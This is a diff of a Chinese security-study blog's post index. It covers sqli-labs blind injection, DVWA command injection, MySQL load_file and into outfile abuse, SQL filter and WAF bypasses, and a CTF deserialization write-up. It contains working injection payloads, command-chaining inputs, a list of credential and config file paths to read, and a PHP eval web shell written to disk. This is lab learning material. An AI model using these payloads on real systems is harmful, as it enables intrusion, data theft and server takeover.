+<p>所以判断为’)闭合</p>
+<h3 id="Less-5-GET-Double-Injection-Single-Quotes-String-双注入GET单引号字符型注入"><a href="#Less-5-GET-Double-Injection-Single-Quotes-String-双注入GET单引号字符型注入" class="headerlink" title="Less-5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)"></a>Less-5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)</h3><h3 id="sql盲注知识点"><a href="#sql盲注知识点" class="headerlink" title="sql盲注知识点"></a>sql盲注知识点</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">left(database(),1)&gt;’s’        //left()函数</span><br></pre></td></tr></table></figure>
+
+<p>Explain:database()显示数据库名称，left(a,b)从左侧截取 a 的前 b 位</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">ascii</span>(<span class="title function_ invoke__">substr</span>((select table_name information_schema.tables where tables_schema=<span class="title function_ invoke__">database</span>()limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">101</span> --+</span><br></pre></td></tr></table></figure>
+
+<p>//substr()函数，ascii()函数</p>
+<p>Explain：substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。Ascii()将某个字符转换</p>
+<p>为 ascii 值</p>
+<p>▲ascii(substr((select database()),1,1))=98</p>
+<p>▲ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER</p>
+<p>BY id LIMIT 0,1),1,1))&gt;98%23</p>
+<p>//ORD()函数，MID()函数</p>
+<p>Explain：mid(a,b,c)从位置 b 开始，截取 a 字符串的 c 位</p>
+<p>Ord()函数同 ascii()，将字符转为 ascii 值</p>
+<p>left(version(),1)=5  查看version()第一位是不是5</p>
+<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670075852822-badc8924-cffa-46c1-a0f1-b932e3d9238d.png" alt="img"></p>
+<p>length(database())=8 查看database()是否为8位</p>
+<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670075936145-605ace9e-1831-4ecf-b81f-0be9826c542d.png" alt="img"></p>
+<p> left(database(),8)=’security’ 查看数据库是否为security</p>
+<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670076538200-5e118c45-dd13-417f-ab6a-ad3e1f78956f.png" alt="img"></p>
+<p>ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101</p>
+<p>此处 table_schema 可以写成 =’security’，但是我们这里使用的 database()，是因为此处 database()就是 security。此处同样的使用二分法进行测试，直到测试正确为止。此处应该是 101，因为第一个表示 email。</p>
+<p>substr(a,b,c)从b位置开始，截取a的c位</p>
+<p>limit 0,1表示的是从第一条记录开始，只取一条即可</p>
+<p>limit 5,10表示的是从第五条记录开始，取十条记录，取到第16条记录</p>
+<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670076947845-a854c8e2-b57f-495f-989e-f3388fb9136a.png" alt="img"></p>
+<p>第五关第六关操作差不多</p>
+<p>剩下的不写了，都差不多</p>
+<p><a href="https://blog.csdn.net/hxhxhxhxx/article/details/107643024">https://blog.csdn.net/hxhxhxhxx/article/details/107643024</a></p>
+<p><a href="https://www.cnblogs.com/-qing-/p/11610385.html#_label0">https://www.cnblogs.com/-qing-/p/11610385.html#_label0</a></p>
+]]></content>
+      <categories>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>靶场</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>DVWA靶场（待补充）</title>
     <url>/2023/01/07/DVWA%E9%9D%B6%E5%9C%BA%EF%BC%88%E5%BE%85%E8%A1%A5%E5%85%85%EF%BC%89/</url>
     <content><![CDATA[<h1 id="Command-Injection-命令执行"><a href="#Command-Injection-命令执行" class="headerlink" title="Command Injection(命令执行)"></a>Command Injection(命令执行)</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &amp; ipconfig　　　　先执行127.0.0.1，不管127.0.0.1是否执行成功都会执行ipconfig</span><br><span class="line">127.0.0.1 &amp;&amp; ipconfig　　  先执行127.0.0.1，127.0.0.1执行成功后才会执行ipconfig</span><br><span class="line">127.0.0.1 | ipconfig　　　　不管127.0.0.1执行是否成功都会执行ipconfig</span><br><span class="line">127.0.0 || ipconfig　　　   前面的命令要执行失败，才可以执行后面的命令</span><br><span class="line">执行 ping 127.0.0.1 ; ipconfig Linux下分隔符</span><br></pre></td></tr></table></figure>
@@ -363,270 +627,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Mysql注入中load_file()与select into outfile命令</title>
-    <url>/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/</url>
-    <content><![CDATA[<h1 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h1><p>查看某个文件的内容</p>
-<p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669856332515-8f2af14e-b76a-4933-a200-921a3c79dceb.png" alt="img"></p>
-<span id="more"></span>
-
-<p>看过<strong>《SQL Injection with MySQL》</strong>的朋友肯定知道用char()函数或者把字符转换成16进制。</p>
-<p>注：当前条件为magic_quotes_gpc=on, c:/boot.ini可读。</p>
-<p>我们构造**$id**为：</p>
-<p>-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</p>
-<p>“char(99,58,47,98,111,111,116,46,105,110,105)”就是”c:/boot.ini”的ASCII代码。</p>
-<p>我们的查询语句就变成：</p>
-<p>select * from article where articleid=-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</p>
-<p>这样我们也可以成功读取boot.ini文件，还有把字符转换为16进制的：</p>
-<p>“c:/boot.ini”的十六进制是”0x633a2f626f6f742e696e69”,16进制前需要加<strong>0x</strong></p>
-<p>所以上面的语句就变成：</p>
-<p>select * from article where articleid=-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)</p>
-<p>在实际应用中，由于种种条件限制，文件的内容未必会显示出来，我们可以用<strong>into outfile</strong>把文件导出</p>
-<p>关于<strong>mysql into outfile</strong>注射，要使用into outfile把代码写到web目录取得webshell首先需要3大先天条件：</p>
-<p>1、知道物理路径（into outfule ‘物理路径’), 这样才能写对目录。</p>
-<p>2、能够使用union （需要mysql 3以上的版本）</p>
-<p>3、对方没有对（’）进行过滤（因为outfile后面的（’’）不可以用其他函数代替转换）</p>
-<p>后天条件需要二个：</p>
-<p>1、就是mysql用户拥有file_priv权限（不然就不能写文件或读文件）</p>
-<p>2、对web目录有写权限MS的系统就不说了，一般都会有权限的，但是*nix的系统，通常都是rwxr-xr-x</p>
-<p>也就是说组跟其他用户都没有权限写操作，所以，要满足这5大条件还是蛮高难度的</p>
-<h2 id="常见用法"><a href="#常见用法" class="headerlink" title="常见用法"></a>常见用法</h2><p>mysql的load_file()常见的用法：</p>
-<p>1、replace(load_file(0×2F6574632F706173737764), 0x3c, 0x20)</p>
-<p>2、replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</p>
-<p>上面两个是查看一些php文件里完全显示代码。有些时候不替换一些字符，如”&lt;”替换成”空格”,返回的是网页。</p>
-<p>而无法查看到代码。</p>
-<p>3、load_file(char(47))可以列出FreeBSD, Sunos系统根目录。</p>
-<p>4、/etc/httpd/conf/httpd.conf或者/usr/local/apache/conf/httpd.conf查看linux apache<a href="https://cloud.tencent.com/product/lighthouse?from=10680">虚拟主机</a>配置文件。</p>
-<p>5、c:/Program Files/Apache Group/Apache/conf/httpd.conf或c:/apache/conf/httpd.conf 查看windows系统</p>
-<p>apache文件。</p>
-<p>6、c:/Resin-3.0.14/conf/resin.conf 或c:/Resin/conf/resin.conf 查看jsp开发网站的resin文件配置信息。</p>
-<p>7、/usr/local/resin/conf/resin.cof 查看linux系统配置的JSP虚拟主机</p>
-<p>8、../themes/darkblue_orange/layout.inc.php phpmyadmin爆路径</p>
-<p>9、c:/windows/system32/inetsrv/MetaBase.xml 查看IIS的虚拟主机配置文件</p>
-<p>10、/usr/local/resin-3.0.22/conf/resin.conf 或 /usr/local/resin-pro-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看</p>
-<p>11、/usr/local/app/apache2/conf/extra/httpd-vhosts.conf Apache虚拟主机查看</p>
-<p>12、/etc/sysconfig/iptables 查看防火墙策略</p>
-<p>13、usr/local/app/php5/lib/php.ini PHP的设置</p>
-<p>14、/etc/my.cnf Mysql的配置文件</p>
-<p>15、c:/mysql/data/mysql/user.MYD 存在MYSQL系统中的用户密码</p>
-<p>16、/etc/sysconfig/network-scripts/ifcfg-eth0 查看IP</p>
-<p>17、/usr/local/app/apache2/conf/extra/httpd-vhosts.conf 虚拟网站设置</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cloud.tencent.com/developer/article/1918345">https://cloud.tencent.com/developer/article/1918345</a></p>
-<h1 id="select-into-outfile命令"><a href="#select-into-outfile命令" class="headerlink" title="select into outfile命令"></a>select into outfile命令</h1><p>在mysql数据库中存在mysql select into outfile命令，该命令与load data infile命令作用恰好相反。该命令的作用是将被选择的一行写入一个文件中。（文件被创建到服务器主机上）</p>
-<p>但是，需要注意的是：into outfile和load_file()两种方式的利用都是具有局限性的。</p>
-<p><strong>其中，into outfile的使用前提是：</strong></p>
-<p>1.<strong>要知道网站的绝对路径，可以通过报错信息、phpinfo界面、404界面等一些方式知道</strong></p>
-<p>2.要有file权限，默认情况下只有root权限有</p>
-<p>3.对目录要有写权限，一般image之类的存放图片的目录有写权限</p>
-<p>还要注意的是：写的文件名一定是在网站中不存在的，不然也会不成功</p>
-<p><strong>select …… into outfile ‘filename’常见的利用方式：</strong></p>
-<p>1.直接写进文件里</p>
-<p>select version() into outfile “绝对路径”,其中version()可以换成其余的查询数据库信息的函数 version()左右不需要加单引号</p>
-<p>2.修改文件结尾</p>
-<p>select ‘<?php @eval($_POST['cmd']);?>‘ into outfile “xxx/test.php”,这里需要获取到网站在系统中的具体路径(绝对路径)  写入内容需要加单引号(不能加双引号)</p>
-<p>那么好，现在我们知道了select…… into outfile的利用方法了</p>
-<p>首先，根据前面几题的经验，我们可以知道该网站目录的绝对路径，且用户是root权限的。那么就满足了我们使用outfile 去获取网站信息的使用前提条件</p>
-<p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669858312565-d4c63848-3797-4e5a-9c09-b82ecc558e85.png" alt="img"></p>
-<p>查版本号</p>
-<p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669858348161-3f7bdfcd-aa20-4aa6-ab24-937ba23497ea.png" alt="img"></p>
-<p>蚁剑连接</p>
-<p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669858460854-566981f4-0498-4403-9def-65d7d09a66d7.png" alt="img"></p>
-<h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/web/275874.html">https://www.freebuf.com/articles/web/275874.html</a></p>
-<p><a href="https://blog.csdn.net/weixin_44377973/article/details/109265546">https://blog.csdn.net/weixin_44377973/article/details/109265546</a></p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SQL报错注入值之extractvalue()、updatexml()、floor()函数</title>
-    <url>/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/</url>
-    <content><![CDATA[<h2 id="extractvalue-、updatexml"><a href="#extractvalue-、updatexml" class="headerlink" title="extractvalue()、updatexml()"></a>extractvalue()、updatexml()</h2><p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670207949127-cfa24f4d-e8ca-4725-919d-42499840042a.png" alt="img"></p>
-<span id="more"></span>
-
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670206958969-003b3e15-ed10-46a0-bf41-7558055941fd.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670207004068-6f2f02ac-6399-4a3d-9301-14c6e6f18b11.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670206895067-49081e1a-3523-4424-ae84-d142b23d1426.png" alt="img"></p>
-<p><a href="https://cloud.tencent.com/developer/article/1740429">https://cloud.tencent.com/developer/article/1740429</a></p>
-<h2 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h2><p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892278118-1283c261-35a2-432c-8bc2-c5c5d7c500f3.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892290951-cdbc385d-a31c-4773-ac64-25e95cbe9b6e.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892309665-0e7152f2-41f7-48d4-ab7d-3782c026b6b7.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892339316-354aff9b-6ad6-4af0-b54e-783de8de5a80.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892353133-6fc1b68d-bc4c-4d55-b9f5-5ec23eef2c6b.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892378736-8b68f3a9-3936-4e9c-a675-0923a3254010.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892459753-24ac857d-3238-4124-b118-7d9d6dda13d5.png" alt="img"></p>
-<p><a href="https://www.freebuf.com/articles/web/257881.html">https://www.freebuf.com/articles/web/257881.html</a></p>
-<p><a href="https://www.freebuf.com/column/235496.html">https://www.freebuf.com/column/235496.html</a></p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SQL注入bypass</title>
-    <url>/2023/01/07/SQL%E6%B3%A8%E5%85%A5bypass/</url>
-    <content><![CDATA[<h3 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h3><p>[<a href="https://www.cnblogs.com/Vinson404/p/7253255.html#:~:text=SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%201%201.%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%EF%BC%88%E6%B3%A8%E9%87%8A%E7%AC%A6%20%2F%2A%20%2A%2F%EF%BC%8C%25a0%20%EF%BC%89%EF%BC%9A%202%202.%E6%8B%AC%E5%8F%B7%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%EF%BC%9A,xor%20not%E7%BB%95%E8%BF%87%EF%BC%9A%207%207.%E7%BB%95%E8%BF%87%E6%B3%A8%E9%87%8A%E7%AC%A6%E5%8F%B7%EF%BC%88%23%EF%BC%8C--%20%28%E5%90%8E%E9%9D%A2%E8%B7%9F%E4%B8%80%E4%B8%AA%E7%A9%BA%E6%A0%BC%EF%BC%89%EF%BC%89%E8%BF%87%E6%BB%A4%EF%BC%9A%208%208.%3D%E7%BB%95%E8%BF%87%EF%BC%9A%20%E6%9B%B4%E5%A4%9A%E9%A1%B9%E7%9B%AE]">https://www.cnblogs.com/Vinson404/p/7253255.html#:~:text=SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%201%201.%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%EF%BC%88%E6%B3%A8%E9%87%8A%E7%AC%A6%20%2F%2A%20%2A%2F%EF%BC%8C%25a0%20%EF%BC%89%EF%BC%9A%202%202.%E6%8B%AC%E5%8F%B7%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%EF%BC%9A,xor%20not%E7%BB%95%E8%BF%87%EF%BC%9A%207%207.%E7%BB%95%E8%BF%87%E6%B3%A8%E9%87%8A%E7%AC%A6%E5%8F%B7%EF%BC%88%23%EF%BC%8C--%20%28%E5%90%8E%E9%9D%A2%E8%B7%9F%E4%B8%80%E4%B8%AA%E7%A9%BA%E6%A0%BC%EF%BC%89%EF%BC%89%E8%BF%87%E6%BB%A4%EF%BC%9A%208%208.%3D%E7%BB%95%E8%BF%87%EF%BC%9A%20%E6%9B%B4%E5%A4%9A%E9%A1%B9%E7%9B%AE]</a>(<a href="https://www.cnblogs.com/Vinson404/p/7253255.html#:~:text=SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7">https://www.cnblogs.com/Vinson404/p/7253255.html#:~:text=SQL注入绕过技巧</a> 1 1.绕过空格（注释符 %2F* *%2F，%a0 ）： 2 2.括号绕过空格：,xor not绕过： 7 7.绕过注释符号（%23，– (后面跟一个空格））过滤： 8 8.%3D绕过： 更多项目)</p>
-<p><a href="https://blog.csdn.net/Likhaooo/article/details/122746954">https://blog.csdn.net/Likhaooo/article/details/122746954</a></p>
-<p><a href="https://blog.csdn.net/huanghelouzi/article/details/82995313">https://blog.csdn.net/huanghelouzi/article/details/82995313</a></p>
-<span id="more"></span>
-
-<h3 id="1-双写绕过"><a href="#1-双写绕过" class="headerlink" title="1.双写绕过"></a>1.双写绕过</h3><p>如：union————uunionnion</p>
-<h3 id="2-大小写绕过"><a href="#2-大小写绕过" class="headerlink" title="2.大小写绕过"></a>2.大小写绕过</h3><p>如：union————uNion</p>
-<h3 id="3-空格绕过"><a href="#3-空格绕过" class="headerlink" title="3.空格绕过"></a>3.空格绕过</h3><p><img src="/2023/01/07/SQL%E6%B3%A8%E5%85%A5bypass/1672904168441-e45d6618-2256-45c6-964d-9947b331e399.png" alt="img"></p>
-<p>/**/</p>
-<p>两个空格代替一个空格，用 Tab 代替空格，%a0=空格</p>
-<p>%20 %09 %0a %0b %0c %0d %a0 </p>
-<p>%09 TAB 键（水平）</p>
-<p>%0a 新建一行</p>
-<p>%0c 新的一页</p>
-<p>%0d return 功能</p>
-<p>%0b TAB 键（垂直）</p>
-<p>%a0 空格</p>
-<p>`` 反引号绕过空格 payload：select * from <code>users</code> where user_id=1 limit 0,1;</p>
-<p>()   括号绕过空格</p>
-<h3 id="4-等号绕过"><a href="#4-等号绕过" class="headerlink" title="4.等号绕过"></a>4.等号绕过</h3><p>like代替=</p>
-<p>&lt;&gt;等价于!=所以我们可以在&lt;&gt;前加个!就变成等于了。</p>
-<p>例如:id=-1’ union select * from users where ! (id&lt;&gt;2)%23</p>
-<p><img src="/2023/01/07/SQL%E6%B3%A8%E5%85%A5bypass/1672835713783-67483261-f53f-4b24-b0ef-d5f06dcbe2c8.png" alt="img"></p>
-<h3 id="5-宽字节注入"><a href="#5-宽字节注入" class="headerlink" title="5.宽字节注入"></a>5.宽字节注入</h3><p>过滤 ‘ 的时候往往利用的思路是将 ‘ 转换为 &#39; 。</p>
-<p>在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字：</p>
-<p>%df 吃掉 \ 具体的方法是 urlencode(‘) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面：</p>
-<p>id=-1%df%27union select 1,user(),3–+</p>
-<p>%df  %de %e0 %e1等字符可以与%5c（’&#39;）结合成为一个字符</p>
-<p><img src="/2023/01/07/SQL%E6%B3%A8%E5%85%A5bypass/1672835895484-1baff8b5-acd7-4fa8-9e3e-8db4747171ad.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%B3%A8%E5%85%A5bypass/1672904257358-2d8b9a5d-ac71-4166-9135-910dc22223b5.png" alt="img"></p>
-<h3 id="安全狗绕过测试"><a href="#安全狗绕过测试" class="headerlink" title="安全狗绕过测试"></a>安全狗绕过测试</h3><p><img src="/2023/01/07/SQL%E6%B3%A8%E5%85%A5bypass/1672905525941-6132af97-256e-4ac2-b0d0-babb9a5a02ce.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%B3%A8%E5%85%A5bypass/1672905052047-8f2b1c70-325a-48fe-862e-606f13468785.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%B3%A8%E5%85%A5bypass/1672905204938-08064d9a-ed11-46b4-ac0b-8c4754cebff7.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%B3%A8%E5%85%A5bypass/1672905348334-c2fd2c55-5508-4ca8-a2ed-5fc405637de7.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%B3%A8%E5%85%A5bypass/1672905381143-bac0ab1c-e501-4c60-a394-5640cc15971c.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%B3%A8%E5%85%A5bypass/1672905451016-7bd3b8b2-2b7f-46be-834b-3c2f35e51ea4.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>(SWPUCTF 2021 新生赛)ez_unserialize</title>
-    <url>/2023/01/07/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/</url>
-    <content><![CDATA[<p><img src="/2023/01/07/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/1671070605858-43f3f5c2-fbff-4677-90ac-0fe0d7781677.png" alt="img"></p>
-<span id="more"></span>
-
-<p>常规来看，找不到题目，找源码。</p>
-<p>源码不给提示。扫目录</p>
-<p><img src="/2023/01/07/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/1671070663737-8aabd0ac-c2ed-4735-93b2-4c0f52442e27.png" alt="img"></p>
-<p>robots.txt里面有不能访问的文件名</p>
-<p><img src="/2023/01/07/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/1671070709712-b23888e2-cc78-4328-9689-dd290d1caed2.png" alt="img"></p>
-<p>代码分析</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(&quot;cl45s.php&quot;);</span><br><span class="line"></span><br><span class="line">class wllm&#123;                              //定义了一个wllm类</span><br><span class="line"></span><br><span class="line">    public $admin;                       //定义类属性admin</span><br><span class="line">    public $passwd;                      //定义类属性passwd</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;       //魔法方法中的__construct方法，当一个对象被创建时调用此方法，好处是可以使构造方法有一个独一无二的名称，无论它所在的类的名称是什么，这样你在改变类的名称时，就不需要改变构造方法的名称</span><br><span class="line">        $this-&gt;admin =&quot;user&quot;;            //定义wllm类中的admin属性值为user</span><br><span class="line">        $this-&gt;passwd = &quot;123456&quot;;        //定义wllm类中的passwd属性值为123456</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        public function __destruct()&#123;     //魔法方法————dustruct，析构方法，PHP将在对象被销毁前（即从内存中清除前）调用这个方法</span><br><span class="line">        if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;ctf&quot;)&#123;  //当admin=admin，passwd=ctf时输出flag</span><br><span class="line">            include(&quot;flag.php&quot;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;                            //反之，输出admin、passwd以及just a bit more</span><br><span class="line">            echo $this-&gt;admin;</span><br><span class="line">            echo $this-&gt;passwd;</span><br><span class="line">            echo &quot;Just a bit more!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$p = $_GET[&#x27;p&#x27;];                           //用get方法接收参数p</span><br><span class="line">unserialize($p);                           //将参数p反序列化</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>所以解题的关键在于将p参数反序列化的内容序列化，一负一正得出flag</p>
-<p>所以构造序列化代码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class wllm&#123;</span><br><span class="line"></span><br><span class="line">    public $admin;</span><br><span class="line">    public $passwd;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;admin =&quot;user&quot;;</span><br><span class="line">        $this-&gt;passwd = &quot;123456&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        public function __destruct()&#123;</span><br><span class="line">        if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;ctf&quot;)&#123;</span><br><span class="line">            include(&quot;flag.php&quot;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo $this-&gt;admin;</span><br><span class="line">            echo $this-&gt;passwd;</span><br><span class="line">            echo &quot;Just a bit more!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$aa=new wllm();             //aa为wllm的实例化对象</span><br><span class="line">$aa-&gt;admin=&quot;admin&quot;;         //aa的admin属性值为admin</span><br><span class="line">$aa-&gt;passwd=&quot;ctf&quot;;          //aa的passwd属性值为ctf</span><br><span class="line">$s=serialize($aa);          //将aa序列化赋值给s</span><br><span class="line">print_r($s);                //输出s</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/01/07/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/1671071554143-e61d21a7-14b5-4ab2-85e6-569c66349c5f.png" alt="img"></p>
-<p>payload</p>
-<p>?p=O:4:”wllm”:2:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:3:”ctf”;}</p>
-<p><img src="/2023/01/07/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/1671071604351-3ab66640-83a3-47fa-865a-52fdc266fd8a.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>反序列化</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Sqlilab靶场</title>
-    <url>/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/</url>
-    <content><![CDATA[<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670049371192-6ee85b0d-6b59-4ea3-9107-3c429c0fe92c.png" alt="img"></p>
-<span id="more"></span>
-
-<h3 id="Less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入"><a href="#Less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入" class="headerlink" title="Less-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)"></a>Less-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)</h3><p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670049620796-0c0add00-ddd5-45e2-8dcd-1c9641b53750.png" alt="img"></p>
-<p>?id=1’    报错  </p>
-<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670049675284-2b4ea92c-e54a-4889-ab02-bdffea0de47d.png" alt="img"></p>
-<p>加了注释符之后不报错，说明是字符型注入</p>
-<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670049729086-d7787685-39b1-4dc9-8ff6-39723195a924.png" alt="img"></p>
-<p>order by 猜字段</p>
